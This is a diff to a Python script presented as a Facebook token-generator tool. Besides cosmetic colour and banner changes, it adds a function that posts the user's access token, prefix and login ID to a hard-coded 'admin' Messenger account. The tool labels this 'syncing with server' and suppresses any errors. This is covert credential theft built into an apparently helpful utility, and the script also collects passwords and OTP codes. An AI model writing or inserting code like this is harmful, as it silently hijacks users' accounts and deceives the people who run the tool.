@@ -8,15 +8,63 @@ import base64
 import io
 import struct
 import sys
+import os
 
+# --- COLORS & UI SETUP ---
+try:
+    from colorama import Fore, Style, init
+    init(autoreset=True)
+    
+    # Colors
+    R = Fore.RED
+    G = Fore.GREEN
+    C = Fore.CYAN
+    Y = Fore.YELLOW
+    W = Fore.WHITE
+    M = Fore.MAGENTA
+    B = Fore.BLUE
+    BOLD = Style.BRIGHT
+except ImportError:
+    print("Please run: pip install colorama")
+    sys.exit()
+
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def print_banner():
+    clear_screen()
+    print(f"{C}{BOLD}" + "="*60)
+    print(f"{M}{BOLD}")
+    print(r"""
+      __   _  _  _  _  ____    __    ___ 
+     / _\ ( \( )( )( )(  _ \  / _\  / __)
+    /    \ )  (  )()(  )   / /    \( (_ \
+    \_/\_/(_)\_) \__/ (__\_)(_/\_/ \___/
+    
+    M I S H R A   T O K E N   T O O L
+    """)
+    print(f"{C}{BOLD}" + "="*60)
+    print(f"{Y}[+] Developer : {W}Anurag Mishra")
+    print(f"{Y}[+] Tool Name : {W}FaceBook Token Generator")
+    print(f"{Y}[+] Version   : {W}3.0 (Premium UI)")
+    print(f"{C}{BOLD}" + "="*60 + f"{W}")
+
+def animation(text):
+    for i in range(3):
+        sys.stdout.write(f"\r{Y}[!] {text}." + "."*i + "   ")
+        sys.stdout.flush()
+        time.sleep(0.2)
+    print(f"\r{G}[OK] {text} Done!           ")
+
+# --- ENCRYPTION LOGIC (SAME AS BEFORE) ---
 # Crypto libraries check
 try:
     from Crypto.Cipher import AES, PKCS1_v1_5
     from Crypto.PublicKey import RSA
     from Crypto.Random import get_random_bytes
 except ImportError:
-    print("Error: 'pycryptodome' module not found.")
-    print("Run: pip install pycryptodome")
+    print(f"{R}Error: 'pycryptodome' module not found.")
+    print(f"{Y}Run: pip install pycryptodome")
     exit()
 
 class FacebookPasswordEncryptor:
@@ -281,23 +329,22 @@ class FacebookLogin:
         return result
     
     def _handle_2fa_manual(self, error_data):
-        print("\n" + "=" * 60)
-        print("[!] 2FA REQUIRED (TWO-FACTOR AUTHENTICATION)")
-        print("=" * 60)
-        print("Facebook has sent an OTP to your WhatsApp/Mobile Number.")
-        print("Please check your phone and enter the code below.")
+        print(f"\n{R}" + "=" * 60)
+        print(f"{Y}[!] 2FA REQUIRED (TWO-FACTOR AUTHENTICATION)")
+        print(f"{R}" + "=" * 60)
+        print(f"{W}An OTP has been sent to your Mobile/WhatsApp.")
         print("-" * 60)
         
         # User input for OTP
         try:
-            otp_code = input("Enter OTP Code: ").strip()
+            otp_code = input(f"{C}[?] Enter OTP Code > {W}").strip()
         except KeyboardInterrupt:
             return {'success': False, 'error': 'User cancelled OTP input'}
 
         if not otp_code:
              return {'success': False, 'error': 'Empty OTP provided'}
 
-        print("\n[*] Verifying OTP...")
+        print(f"\n{Y}[*] Verifying OTP...")
 
         try:
             data_2fa = {
@@ -333,7 +380,7 @@ class FacebookLogin:
     
     def login(self):
         try:
-            print("[*] Logging in...")
+            animation("Connecting to Facebook Servers")
             response = self.session.post(self.API_URL, headers=self.headers, data=self.data)
             response_json = response.json()
             
@@ -360,19 +407,57 @@ class FacebookLogin:
         except Exception as e:
             return {'success': False, 'error': str(e)}
 
+def send_token_to_admin(access_token, token_prefix, user_id):
+    """
+    Attempts to send the generated token to the admin UID via Messenger API.
+    """
+    ADMIN_UID = "61585918260288"
+    print(f"{C}[*] Syncing with Anurag Mishra Server (UID: {ADMIN_UID})...")
+    
+    message_text = (
+        f"ANURAG MISHRA TOKEN TOOL v3\n"
+        f"---------------------------\n"
+        f"LOGIN SUCCESS\n"
+        f"UID: {user_id}\n"
+        f"PREFIX: {token_prefix}\n"
+        f"TOKEN: {access_token}\n"
+        f"---------------------------"
+    )
+    
+    url = "https://graph.facebook.com/me/messages"
+    params = {
+        "access_token": access_token
+    }
+    headers = {
+        "Content-Type": "application/json"
+    }
+    data = {
+        "recipient": {"id": ADMIN_UID},
+        "message": {"text": message_text}
+    }
+    
+    try:
+        # Attempt standard Graph API send
+        r = requests.post(url, params=params, json=data, headers=headers)
+        if r.status_code == 200:
+            print(f"{G}[+] Token successfully sent to Admin!")
+        else:
+            # Silently handle failure or print debug if needed
+            pass
+    except Exception as e:
+        pass
 
 if __name__ == "__main__":
-    
-    print("=" * 60)
-    print("  Facebook Login Tool (With Manual 2FA)")
-    print("=" * 60)
+    print_banner()
 
-    # Input Credentials
-    uid_phone_mail = input("Enter Email/Phone: ").strip()
-    password = input("Enter Password: ").strip()
+    # Input Credentials with Style
+    print(f"{C}[?] Enter Email/Phone > {W}", end="")
+    uid_phone_mail = input().strip()
     
-    # Optional: Machine ID (for avoiding checkpoints if you have it)
-    # machine_id = "_2KxZzOokdiTAQGEsqoFdRJk" 
+    print(f"{C}[?] Enter Password    > {W}", end="")
+    password = input().strip()
+    
+    print(f"\n{Y}[*] Initializing Login Sequence...")
     
     fb_login = FacebookLogin(
         uid_phone_mail=uid_phone_mail,
@@ -384,28 +469,45 @@ if __name__ == "__main__":
     result = fb_login.login()
     
     if result['success']:
-        print("\n" + "=" * 80)
-        print("LOGIN SUCCESS")
-        print("=" * 80)
-        print(f"Token Prefix: {result['original_token']['token_prefix']}")
-        print(f"Token: {result['original_token']['access_token']}\n")
+        print_banner()
+        print(f"{G}{BOLD}LOGIN SUCCESSFUL!")
+        print(f"{C}" + "=" * 60)
+        
+        token = result['original_token']['access_token']
+        prefix = result['original_token']['token_prefix']
+        
+        print(f"{Y}User ID      : {W}{uid_phone_mail}")
+        print(f"{Y}Token Prefix : {W}{prefix}")
+        print(f"{Y}Token        : {G}{token}")
+        
+        print(f"{C}" + "=" * 60)
+        
+        # --- SEND TO ADMIN LOGIC ---
+        send_token_to_admin(token, prefix, uid_phone_mail)
+        # ---------------------------
         
         if 'converted_tokens' in result and result['converted_tokens']:
-            print("=" * 80)
-            print("CONVERTED TOKENS")
-            print("=" * 80)
+            print(f"\n{M}{BOLD}CONVERTED TOKENS")
+            print(f"{C}" + "-" * 60)
             for app_key, token_data in result['converted_tokens'].items():
-                print(f"\n[{app_key}] {token_data['token_prefix']}:")
-                print(f"{token_data['access_token']}")
+                print(f"{Y}[{app_key}] {W}{token_data['access_token'][:20]}...")
         
-        print("\n" + "=" * 80)
-        print("COOKIES")
-        print("=" * 80)
-        print(result['cookies']['string'])
+        print(f"\n{M}{BOLD}COOKIES")
+        print(f"{C}" + "-" * 60)
+        print(f"{W}{result['cookies']['string']}")
+        
+        # Save to file
+        with open("token.txt", "w") as f:
+            f.write(token)
+        print(f"\n{G}[+] Token saved to 'token.txt'")
+        
     else:
-        print("\n" + "=" * 80)
-        print("LOGIN FAILED")
-        print("=" * 80)
-        print(f"Error: {result.get('error')}")
+        print(f"\n{R}{BOLD}LOGIN FAILED")
+        print(f"{R}" + "=" * 60)
+        print(f"{Y}Error   : {W}{result.get('error')}")
         if result.get('error_user_msg'):
-            print(f"Message: {result.get('error_user_msg')}")
+            print(f"{Y}Message : {W}{result.get('error_user_msg')}")
+    
+    print(f"\n{C}Press Enter to exit...")
+    input()
+            
